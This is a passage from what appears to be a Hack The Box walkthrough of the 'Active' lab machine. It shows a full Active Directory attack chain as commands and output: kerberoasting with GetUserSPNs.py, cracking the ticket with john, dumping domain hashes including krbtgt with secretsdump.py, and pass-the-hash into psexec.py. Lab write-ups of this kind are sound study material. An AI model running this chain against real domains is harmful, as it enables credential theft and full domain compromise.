</span></span><span class=line><span class=cl><span class=nx>memberOf</span><span class=o>:</span> <span class=nx>CN</span><span class=o>=</span><span class=nx>Enterprise</span> <span class=nx>Admins</span><span class=p>,</span><span class=nx>CN</span><span class=o>=</span><span class=nx>Users</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>active</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>htb</span>
</span></span><span class=line><span class=cl><span class=nx>memberOf</span><span class=o>:</span> <span class=nx>CN</span><span class=o>=</span><span class=nx>Schema</span> <span class=nx>Admins</span><span class=p>,</span><span class=nx>CN</span><span class=o>=</span><span class=nx>Users</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>active</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>htb</span>
</span></span><span class=line><span class=cl><span class=nx>memberOf</span><span class=o>:</span> <span class=nx>CN</span><span class=o>=</span><span class=nx>Administrators</span><span class=p>,</span><span class=nx>CN</span><span class=o>=</span><span class=nx>Builtin</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>active</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>htb</span>
</span></span><span class=line><span class=cl><span class=nx>uSNChanged</span><span class=o>:</span> <span class=mi>114725</span>
</span></span><span class=line><span class=cl><span class=nx>name</span><span class=o>:</span> <span class=nx>Administrator</span>
</span></span><span class=line><span class=cl><span class=nx>objectGUID</span><span class=o>::</span> <span class=nx>jnHKJRJzf0aVWkxPEJY8Hg</span><span class=o>==</span>
</span></span><span class=line><span class=cl><span class=nx>userAccountControl</span><span class=o>:</span> <span class=mi>66048</span>
</span></span><span class=line><span class=cl><span class=nx>badPwdCount</span><span class=o>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=nx>codePage</span><span class=o>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=nx>countryCode</span><span class=o>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=nx>badPasswordTime</span><span class=o>:</span> <span class=mi>131774446554773106</span>
</span></span><span class=line><span class=cl><span class=nx>lastLogoff</span><span class=o>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=nx>lastLogon</span><span class=o>:</span> <span class=mi>133421175785917565</span>
</span></span><span class=line><span class=cl><span class=nx>logonHours</span><span class=o>::</span> <span class=c1>////////////////////////////
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>pwdLastSet</span><span class=o>:</span> <span class=mi>131764144003517228</span>
</span></span><span class=line><span class=cl><span class=nx>primaryGroupID</span><span class=o>:</span> <span class=mi>513</span>
</span></span><span class=line><span class=cl><span class=nx>objectSid</span><span class=o>::</span> <span class=nx>AQUAAAAAAAUVAAAArxktGAS1AL49Gv129AEAAA</span><span class=o>==</span>
</span></span><span class=line><span class=cl><span class=nx>adminCount</span><span class=o>:</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=nx>accountExpires</span><span class=o>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=nx>logonCount</span><span class=o>:</span> <span class=mi>64</span>
</span></span><span class=line><span class=cl><span class=nx>sAMAccountName</span><span class=o>:</span> <span class=nx>Administrator</span>
</span></span><span class=line><span class=cl><span class=nx>sAMAccountType</span><span class=o>:</span> <span class=mi>805306368</span>
</span></span><span class=line><span class=cl><span class=nx>servicePrincipalName</span><span class=o>:</span> <span class=nx>active</span><span class=o>/</span><span class=nx>CIFS</span><span class=o>:</span><span class=mi>445</span>
</span></span><span class=line><span class=cl><span class=nx>objectCategory</span><span class=o>:</span> <span class=nx>CN</span><span class=o>=</span><span class=nx>Person</span><span class=p>,</span><span class=nx>CN</span><span class=o>=</span><span class=nx>Schema</span><span class=p>,</span><span class=nx>CN</span><span class=o>=</span><span class=nx>Configuration</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>active</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>htb</span>
</span></span><span class=line><span class=cl><span class=nx>isCriticalSystemObject</span><span class=o>:</span> <span class=nx>TRUE</span>
</span></span><span class=line><span class=cl><span class=nx>dSCorePropagationData</span><span class=o>:</span> <span class=mf>20180718203435.0</span><span class=nx>Z</span>
</span></span><span class=line><span class=cl><span class=nx>dSCorePropagationData</span><span class=o>:</span> <span class=mf>20180718201454.0</span><span class=nx>Z</span>
</span></span><span class=line><span class=cl><span class=nx>dSCorePropagationData</span><span class=o>:</span> <span class=mf>20180718190545.0</span><span class=nx>Z</span>
</span></span><span class=line><span class=cl><span class=nx>dSCorePropagationData</span><span class=o>:</span> <span class=mf>20180718190545.0</span><span class=nx>Z</span>
</span></span><span class=line><span class=cl><span class=nx>dSCorePropagationData</span><span class=o>:</span> <span class=mf>16010101000000.0</span><span class=nx>Z</span>
</span></span><span class=line><span class=cl><span class=nx>lastLogonTimestamp</span><span class=o>:</span> <span class=mi>133421175484525035</span>
</span></span><span class=line><span class=cl><span class=nx>msDS</span><span class=o>-</span><span class=nx>SupportedEncryptionTypes</span><span class=o>:</span> <span class=mi>0</span>
</span></span></code></pre></div><p>Here we can see that the administrator account is vulnerable to kerberoasting. We can use <code>impackets</code> <code>GetUserSPN.py</code> to request <code>TGS</code> ticket. Then we can crack the password offline to get credentials for the administrator.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/active/svc_tgs_smb]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$GetUserSPNs</span><span class=p>.</span><span class=nx>py</span> <span class=s1>&#39;active.htb/svc_tgs:GPPstillStandingStrong2k18&#39;</span>
</span></span><span class=line><span class=cl><span class=nx>Impacket</span> <span class=nx>v0</span><span class=mf>.10.1</span><span class=p>.</span><span class=nx>dev1</span><span class=o>+</span><span class=mf>20230504.43204.0</span><span class=nx>bdad34a</span> <span class=o>-</span> <span class=nx>Copyright</span> <span class=mi>2022</span> <span class=nx>Fortra</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>ServicePrincipalName</span>  <span class=nx>Name</span>           <span class=nx>MemberOf</span>                                                  <span class=nx>PasswordLastSet</span>             <span class=nx>LastLogon</span>                   <span class=nx>Delegation</span> 
</span></span><span class=line><span class=cl><span class=o>--------------------</span>  <span class=o>-------------</span>  <span class=o>--------------------------------------------------------</span>  <span class=o>--------------------------</span>  <span class=o>--------------------------</span>  <span class=o>----------</span>
</span></span><span class=line><span class=cl><span class=nx>active</span><span class=o>/</span><span class=nx>CIFS</span><span class=o>:</span><span class=mi>445</span>       <span class=nx>Administrator</span>  <span class=nx>CN</span><span class=o>=</span><span class=nx>Group</span> <span class=nx>Policy</span> <span class=nx>Creator</span> <span class=nx>Owners</span><span class=p>,</span><span class=nx>CN</span><span class=o>=</span><span class=nx>Users</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>active</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>htb</span>  <span class=mi>2018</span><span class=o>-</span><span class=mi>07</span><span class=o>-</span><span class=mi>18</span> <span class=mi>15</span><span class=o>:</span><span class=mi>06</span><span class=o>:</span><span class=mf>40.351723</span>  <span class=mi>2023</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>18</span> <span class=mi>11</span><span class=o>:</span><span class=mi>46</span><span class=o>:</span><span class=mf>18.591757</span>             
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/active/svc_tgs_smb]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$GetUserSPNs</span><span class=p>.</span><span class=nx>py</span> <span class=s1>&#39;active.htb/svc_tgs:GPPstillStandingStrong2k18&#39;</span> <span class=o>-</span><span class=nx>request</span>
</span></span><span class=line><span class=cl><span class=nx>Impacket</span> <span class=nx>v0</span><span class=mf>.10.1</span><span class=p>.</span><span class=nx>dev1</span><span class=o>+</span><span class=mf>20230504.43204.0</span><span class=nx>bdad34a</span> <span class=o>-</span> <span class=nx>Copyright</span> <span class=mi>2022</span> <span class=nx>Fortra</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>ServicePrincipalName</span>  <span class=nx>Name</span>           <span class=nx>MemberOf</span>                                                  <span class=nx>PasswordLastSet</span>             <span class=nx>LastLogon</span>                   <span class=nx>Delegation</span> 
</span></span><span class=line><span class=cl><span class=o>--------------------</span>  <span class=o>-------------</span>  <span class=o>--------------------------------------------------------</span>  <span class=o>--------------------------</span>  <span class=o>--------------------------</span>  <span class=o>----------</span>
</span></span><span class=line><span class=cl><span class=nx>active</span><span class=o>/</span><span class=nx>CIFS</span><span class=o>:</span><span class=mi>445</span>       <span class=nx>Administrator</span>  <span class=nx>CN</span><span class=o>=</span><span class=nx>Group</span> <span class=nx>Policy</span> <span class=nx>Creator</span> <span class=nx>Owners</span><span class=p>,</span><span class=nx>CN</span><span class=o>=</span><span class=nx>Users</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>active</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>htb</span>  <span class=mi>2018</span><span class=o>-</span><span class=mi>07</span><span class=o>-</span><span class=mi>18</span> <span class=mi>15</span><span class=o>:</span><span class=mi>06</span><span class=o>:</span><span class=mf>40.351723</span>  <span class=mi>2023</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>18</span> <span class=mi>11</span><span class=o>:</span><span class=mi>46</span><span class=o>:</span><span class=mf>18.591757</span>             
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>CCache</span> <span class=nx>file</span> <span class=nx>is</span> <span class=nx>not</span> <span class=nx>found</span><span class=p>.</span> <span class=nx>Skipping</span><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=nx>$krb5tgs$23$</span><span class=o>*</span><span class=nx>Administrator$ACTIVE</span><span class=p>.</span><span class=nx>HTB$active</span><span class=p>.</span><span class=nx>htb</span><span class=o>/</span><span class=nx>Administrator</span><span class=o>*</span><span class=nx>$8294eeac00efb6a535832717bf5a1451$4f37fdd250c515dc4f57eb3604f4ea35acbd738bb1f5bb9377d6f1783f2283790fc4d26c19c6d728cfd4fb6d9fbf08a8c8ef3d97fc9efe5cd8d42d734fbbbb793ef6afb31de509c6086cb7b753335827fb0ba395e37740ca9c97709f3c7838102dc571a870e5b3b4c0619f764f3f630f698ac304ec398c014eaecf1fda2426a5f995dece41df6edd827550027cbba0a26bc2336c3168f89c0f9be84e29b563c4bd381eaafa17c6f9ad0a72563aee92d034995dd045f1eafa4f46711b0a94b9a9cb7fa68957d909f5056cc17b4788d228df96ebce4a2c87bef518430fde760d056188875bc5d5031564f10479c30dd1206fb4f796eb907e7ead2d9d288047da59fd641a2eb15e4222441434ecdb6a544608fb89b6297893424b80fcff84645e5f53f77a504ea5d9fbfd6a708546b4d24180988325718105e1c569c92fcac0b5c69e10c3d7cf59f19cb5cd8d46a16afcd782482e3382fbf3ae75a3397feb8dc82b8ed1378dc22d967d3b5390ca475ae23657c3b228be7637b5a3fc0e891aba8a80ac58c8c0267de6cd8f20408f139775f6ef5b93b80d003abbcad161326e1a202c6af739e155be508a7daa7a52bd6bb01abb0d914a10dd671ddaea232a14a58c13a3da44294450da92b96c02684ce5113df319589beb9f8bac2f9a809dd4f26d6f67e672d9e7409799a259c70f10835794cd558daa7847bd49532c6d704c8911ad9977a6d41221bd8403c3679599cf081f7986ee849992b515e1e5df661b4716fb147f9a5d6092b445c1543a60ed7acd85d23161135d23aa159040e66d5af13c3cbcb89c2dfcd2c59ea5f57fd6e32fd04ad4b9db13932fd484576ea7d68b9af978af6ed96fc796c7ecb9a336d0027102e34fe65fc29db9fd9b9ba67e42272a7d37f9d2ef237a0bedf4f38989610d91b462a61158c311148ca89e7da0cc7477be3ea02496ce73cf27a8fcdee4c0e5374fdefaa4163770679e571601a9cd75e5d93455efb03460ccf72fe12a7cc9fee80833e65267ec9a9ed284690d6609e6c838042328d540aba7b4900a626e1f48170091bb83e9ec0857b6313990d12e8f5efc85cefcd23ff967e3bccb7bef7f66d40df50842e3737d5b9e832a939859b6b950de2f7f2b89fcfbd9a95f890b8db87bfe5b0458454571ab1d19a9688cbbd623733a12ea0b38398f644082efdb554012efbd683080de5f32370f1ce96aa920d36f48e7f22100e126e5a207ea7a634de829c8bc374d35b292ce990fb8</span>
</span></span></code></pre></div><p>We can crack these either with john the ripper or hashcat. We need to know the mode in hashcat but john automatically detects the type of hash.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/active]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$john</span> <span class=nx>admin</span>  <span class=o>--</span><span class=nx>wordlist</span><span class=o>=</span><span class=err>/usr/share/wordlists/rockyou.txt</span>
</span></span><span class=line><span class=cl><span class=nx>Using</span> <span class=k>default</span> <span class=nx>input</span> <span class=nx>encoding</span><span class=o>:</span> <span class=nx>UTF</span><span class=o>-</span><span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=nx>Loaded</span> <span class=mi>1</span> <span class=nx>password</span> <span class=nx>hash</span> <span class=p>(</span><span class=nx>krb5tgs</span><span class=p>,</span> <span class=nx>Kerberos</span> <span class=mi>5</span> <span class=nx>TGS</span> <span class=nx>etype</span> <span class=mi>23</span> <span class=p>[</span><span class=nx>MD4</span> <span class=nx>HMAC</span><span class=o>-</span><span class=nx>MD5</span> <span class=nx>RC4</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=nx>Will</span> <span class=nx>run</span> <span class=mi>3</span> <span class=nx>OpenMP</span> <span class=nx>threads</span>
</span></span><span class=line><span class=cl><span class=nx>Press</span> <span class=s1>&#39;q&#39;</span> <span class=nx>or</span> <span class=nx>Ctrl</span><span class=o>-</span><span class=nx>C</span> <span class=nx>to</span> <span class=nx>abort</span><span class=p>,</span> <span class=nx>almost</span> <span class=nx>any</span> <span class=nx>other</span> <span class=nx>key</span> <span class=k>for</span> <span class=nx>status</span>
</span></span><span class=line><span class=cl><span class=mi>0</span><span class=nx>g</span> <span class=mi>0</span><span class=o>:</span><span class=mi>00</span><span class=o>:</span><span class=mi>00</span><span class=o>:</span><span class=mi>08</span> <span class=mf>58.29</span><span class=o>%</span> <span class=p>(</span><span class=nx>ETA</span><span class=o>:</span> <span class=mi>06</span><span class=o>:</span><span class=mi>06</span><span class=o>:</span><span class=mi>55</span><span class=p>)</span> <span class=mi>0</span><span class=nx>g</span><span class=o>/</span><span class=nx>s</span> <span class=mi>1014</span><span class=nx>Kp</span><span class=o>/</span><span class=nx>s</span> <span class=mi>1014</span><span class=nx>Kc</span><span class=o>/</span><span class=nx>s</span> <span class=mi>1014</span><span class=nx>KC</span><span class=o>/</span><span class=nx>s</span> <span class=nx>ee0133381186</span><span class=p>..</span><span class=nx>edword11</span>
</span></span><span class=line><span class=cl><span class=nx>Ticketmaster1968</span> <span class=p>(</span><span class=o>?</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>1</span><span class=nx>g</span> <span class=mi>0</span><span class=o>:</span><span class=mi>00</span><span class=o>:</span><span class=mi>00</span><span class=o>:</span><span class=mi>10</span> <span class=nx>DONE</span> <span class=p>(</span><span class=mi>2023</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>19</span> <span class=mi>06</span><span class=o>:</span><span class=mi>06</span><span class=p>)</span> <span class=mf>0.09487</span><span class=nx>g</span><span class=o>/</span><span class=nx>s</span> <span class=mi>999784</span><span class=nx>p</span><span class=o>/</span><span class=nx>s</span> <span class=mi>999784</span><span class=nx>c</span><span class=o>/</span><span class=nx>s</span> <span class=mi>999784</span><span class=nx>C</span><span class=o>/</span><span class=nx>s</span> <span class=nx>Tiffani1432</span><span class=p>..</span><span class=nx>Thurman16</span>
</span></span><span class=line><span class=cl><span class=nx>Use</span> <span class=nx>the</span> <span class=s2>&#34;--show&#34;</span> <span class=nx>option</span> <span class=nx>to</span> <span class=nx>display</span> <span class=nx>all</span> <span class=k>of</span> <span class=nx>the</span> <span class=nx>cracked</span> <span class=nx>passwords</span> <span class=nx>reliably</span>
</span></span><span class=line><span class=cl><span class=nx>Session</span> <span class=nx>completed</span>
</span></span></code></pre></div><p>We can dump the domain hashes with <code>secretsdump.py</code> .</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/active]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$secretsdump</span><span class=p>.</span><span class=nx>py</span> <span class=s1>&#39;active.htb/administrator:Ticketmaster1968@10.10.10.100&#39;</span>
</span></span><span class=line><span class=cl><span class=nx>Impacket</span> <span class=nx>v0</span><span class=mf>.10.1</span><span class=p>.</span><span class=nx>dev1</span><span class=o>+</span><span class=mf>20230504.43204.0</span><span class=nx>bdad34a</span> <span class=o>-</span> <span class=nx>Copyright</span> <span class=mi>2022</span> <span class=nx>Fortra</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Target</span> <span class=nx>system</span> <span class=nx>bootKey</span><span class=o>:</span> <span class=mh>0xff954ee81ffb63937b563f523caf1d59</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Dumping</span> <span class=nx>local</span> <span class=nx>SAM</span> <span class=nx>hashes</span> <span class=p>(</span><span class=nx>uid</span><span class=o>:</span><span class=nx>rid</span><span class=o>:</span><span class=nx>lmhash</span><span class=o>:</span><span class=nx>nthash</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>Administrator</span><span class=o>:</span><span class=mi>500</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>5</span><span class=nx>c15eb37006fb74c21a5d1e2144b726e</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>Guest</span><span class=o>:</span><span class=mi>501</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>31</span><span class=nx>d6cfe0d16ae931b73c59d7e0c089c0</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Dumping</span> <span class=nx>cached</span> <span class=nx>domain</span> <span class=nx>logon</span> <span class=nx>information</span> <span class=p>(</span><span class=nx>domain</span><span class=o>/</span><span class=nx>username</span><span class=o>:</span><span class=nx>hash</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Dumping</span> <span class=nx>LSA</span> <span class=nx>Secrets</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>$MACHINE</span><span class=p>.</span><span class=nx>ACC</span> 
</span></span><span class=line><span class=cl><span class=nx>ACTIVE</span><span class=err>\</span><span class=nx>DC$</span><span class=o>:</span><span class=nx>aes256</span><span class=o>-</span><span class=nx>cts</span><span class=o>-</span><span class=nx>hmac</span><span class=o>-</span><span class=nx>sha1</span><span class=o>-</span><span class=mi>96</span><span class=o>:</span><span class=mi>5</span><span class=nx>de5e20ae2611f75df65633ab000d7c04b5e41c46bc1c02f90291097184d394f</span>
</span></span><span class=line><span class=cl><span class=nx>ACTIVE</span><span class=err>\</span><span class=nx>DC$</span><span class=o>:</span><span class=nx>aes128</span><span class=o>-</span><span class=nx>cts</span><span class=o>-</span><span class=nx>hmac</span><span class=o>-</span><span class=nx>sha1</span><span class=o>-</span><span class=mi>96</span><span class=o>:</span><span class=mi>022</span><span class=nx>fc4401e538ae98c89bca738cb0193</span>
</span></span><span class=line><span class=cl><span class=nx>ACTIVE</span><span class=err>\</span><span class=nx>DC$</span><span class=o>:</span><span class=nx>des</span><span class=o>-</span><span class=nx>cbc</span><span class=o>-</span><span class=nx>md5</span><span class=o>:</span><span class=mi>1</span><span class=nx>afe5873389df29d</span>
</span></span><span class=line><span class=cl><span class=nx>ACTIVE</span><span class=err>\</span><span class=nx>DC$</span><span class=o>:</span><span class=nx>plain_password_hex</span><span class=o>:</span><span class=mi>19</span><span class=nx>d2ce6f30f7603634988e3f6bd9dff85c1e66410596bfe7184e01edf6d91c8787d74c2a2d77726e018c7ca1a2be300c4fe90464be799513980c389e993c7cc894ef5d036c41cb587bcdb601622c2be5231c3e84d6cf968b158e4c75a85d0bea3664ab75261dff7ee8a623729d9c7f158f77c00c3c05188a6ce2472b4a2cfdd40e60aadb6a71554c6f58d52792c5140e63693fc0a1d4439956e6d2353ea0de25bd131d7025a7914a7d20750213e25522fceafdc3c26792abb2f5415f524367b9d4d49f12e968b924c96a02581b257529196001d1dd0640f311a9f1cb3730a92bc76813a2f071b3abc0e3f5c81b83469c</span>
</span></span><span class=line><span class=cl><span class=nx>ACTIVE</span><span class=err>\</span><span class=nx>DC$</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>5</span><span class=nx>b9f6d9fdf7d10f0c07ed64660f94fa1</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>DefaultPassword</span> 
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nx>Unknown</span> <span class=nx>User</span><span class=p>)</span><span class=o>:</span><span class=nx>ROOT</span><span class=err>#</span><span class=mi>123</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>DPAPI_SYSTEM</span> 
</span></span><span class=line><span class=cl><span class=nx>dpapi_machinekey</span><span class=o>:</span><span class=mh>0x377bd35be67705f345dabf00d3181e269e0fb1e6</span>
</span></span><span class=line><span class=cl><span class=nx>dpapi_userkey</span><span class=o>:</span><span class=mh>0x7586c391e559565c85cb342d1d24546381f0d5cb</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>NL$KM</span> 
</span></span><span class=line><span class=cl> <span class=mi>0000</span>   <span class=nx>CC</span> <span class=mi>6</span><span class=nx>F</span> <span class=nx>B8</span> <span class=mi>46</span> <span class=nx>C3</span> <span class=mi>0</span><span class=nx>C</span> <span class=mi>58</span> <span class=mi>05</span>  <span class=mi>2</span><span class=nx>F</span> <span class=nx>F2</span> <span class=mi>07</span> <span class=mi>2</span><span class=nx>E</span> <span class=nx>DA</span> <span class=nx>E6</span> <span class=nx>BF</span> <span class=mi>7</span><span class=nx>D</span>   <span class=p>.</span><span class=nx>o</span><span class=p>.</span><span class=nx>F</span><span class=p>..</span><span class=nx>X</span><span class=p>.</span><span class=o>/</span><span class=p>......}</span>
</span></span><span class=line><span class=cl> <span class=mi>0010</span>   <span class=mi>60</span> <span class=mi>63</span> <span class=nx>F6</span> <span class=mi>89</span> <span class=nx>E7</span> <span class=mi>0</span><span class=nx>E</span> <span class=nx>D5</span> <span class=nx>D5</span>  <span class=mi>22</span> <span class=nx>EE</span> <span class=mi>54</span> <span class=nx>DA</span> <span class=mi>63</span> <span class=mi>12</span> <span class=mi>5</span><span class=nx>B</span> <span class=nx>B5</span>   <span class=sb>`c......&#34;.T.c.[.
</span></span></span><span class=line><span class=cl><span class=sb> 0020   D8 DA 0B B7 82 0E 3D E1  9D 7A 03 15 08 5C B0 AE   ......=..z...</span><span class=err>\</span><span class=sb>..
</span></span></span><span class=line><span class=cl><span class=sb> 0030   EF 63 91 B9 6C 87 65 A8  14 62 95 BC 77 69 77 08   .c..l.e..b..wiw.
</span></span></span><span class=line><span class=cl><span class=sb>NL$KM:cc6fb846c30c58052ff2072edae6bf7d6063f689e70ed5d522ee54da63125bb5d8da0bb7820e3de19d7a0315085cb0aeef6391b96c8765a8146295bc77697708
</span></span></span><span class=line><span class=cl><span class=sb>[*] Dumping Domain Credentials (domain</span><span class=err>\</span><span class=sb>uid:rid:lmhash:nthash)
</span></span></span><span class=line><span class=cl><span class=sb>[*] Using the DRSUAPI method to get NTDS.DIT secrets
</span></span></span><span class=line><span class=cl><span class=sb>Administrator:500:aad3b435b51404eeaad3b435b51404ee:5ffb4aaaf9b63dc519eca04aec0e8bed:::
</span></span></span><span class=line><span class=cl><span class=sb>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span></span><span class=line><span class=cl><span class=sb>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b889e0d47d6fe22c8f0463a717f460dc:::
</span></span></span><span class=line><span class=cl><span class=sb>active.htb</span><span class=err>\</span><span class=sb>SVC_TGS:1103:aad3b435b51404eeaad3b435b51404ee:f54f3a1d3c38140684ff4dad029f25b5:::
</span></span></span><span class=line><span class=cl><span class=sb>DC$:1000:aad3b435b51404eeaad3b435b51404ee:5b9f6d9fdf7d10f0c07ed64660f94fa1:::
</span></span></span><span class=line><span class=cl><span class=sb>[*] Kerberos keys grabbed
</span></span></span><span class=line><span class=cl><span class=sb>Administrator:aes256-cts-hmac-sha1-96:003b207686cfdbee91ff9f5671aa10c5d940137da387173507b7ff00648b40d8
</span></span></span><span class=line><span class=cl><span class=sb>Administrator:aes128-cts-hmac-sha1-96:48347871a9f7c5346c356d76313668fe
</span></span></span><span class=line><span class=cl><span class=sb>Administrator:des-cbc-md5:5891549b31f2c294
</span></span></span><span class=line><span class=cl><span class=sb>krbtgt:aes256-cts-hmac-sha1-96:cd80d318efb2f8752767cd619731b6705cf59df462900fb37310b662c9cf51e9
</span></span></span><span class=line><span class=cl><span class=sb>krbtgt:aes128-cts-hmac-sha1-96:b9a02d7bd319781bc1e0a890f69304c3
</span></span></span><span class=line><span class=cl><span class=sb>krbtgt:des-cbc-md5:9d044f891adf7629
</span></span></span><span class=line><span class=cl><span class=sb>active.htb</span><span class=err>\</span><span class=sb>SVC_TGS:aes256-cts-hmac-sha1-96:d59943174b17c1a4ced88cc24855ef242ad328201126d296bb66aa9588e19b4a
</span></span></span><span class=line><span class=cl><span class=sb>active.htb</span><span class=err>\</span><span class=sb>SVC_TGS:aes128-cts-hmac-sha1-96:f03559334c1111d6f792d74a453d6f31
</span></span></span><span class=line><span class=cl><span class=sb>active.htb</span><span class=err>\</span><span class=sb>SVC_TGS:des-cbc-md5:d6c7eca70862f1d0
</span></span></span><span class=line><span class=cl><span class=sb>DC$:aes256-cts-hmac-sha1-96:5de5e20ae2611f75df65633ab000d7c04b5e41c46bc1c02f90291097184d394f
</span></span></span><span class=line><span class=cl><span class=sb>DC$:aes128-cts-hmac-sha1-96:022fc4401e538ae98c89bca738cb0193
</span></span></span><span class=line><span class=cl><span class=sb>DC$:des-cbc-md5:02861ca1a71907a1
</span></span></span><span class=line><span class=cl><span class=sb>[*] Cleaning up...
</span></span></span></code></pre></div><p>We can get system shell with <code>psexec.py</code> .</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/active/svc_tgs_smb]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$psexec</span><span class=p>.</span><span class=nx>py</span> <span class=s1>&#39;active.htb/administrator@dc.active.htb&#39;</span> <span class=o>-</span><span class=nx>hashes</span> <span class=s1>&#39;aad3b435b51404eeaad3b435b51404ee:5ffb4aaaf9b63dc519eca04aec0e8bed&#39;</span>
</span></span><span class=line><span class=cl><span class=nx>Impacket</span> <span class=nx>v0</span><span class=mf>.10.1</span><span class=p>.</span><span class=nx>dev1</span><span class=o>+</span><span class=mf>20230504.43204.0</span><span class=nx>bdad34a</span> <span class=o>-</span> <span class=nx>Copyright</span> <span class=mi>2022</span> <span class=nx>Fortra</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Requesting</span> <span class=nx>shares</span> <span class=nx>on</span> <span class=nx>dc</span><span class=p>.</span><span class=nx>active</span><span class=p>.</span><span class=nx>htb</span><span class=p>.....</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Found</span> <span class=nx>writable</span> <span class=nx>share</span> <span class=nx>ADMIN$</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Uploading</span> <span class=nx>file</span> <span class=nx>AHYMkugS</span><span class=p>.</span><span class=nx>exe</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Opening</span> <span class=nx>SVCManager</span> <span class=nx>on</span> <span class=nx>dc</span><span class=p>.</span><span class=nx>active</span><span class=p>.</span><span class=nx>htb</span><span class=p>.....</span>
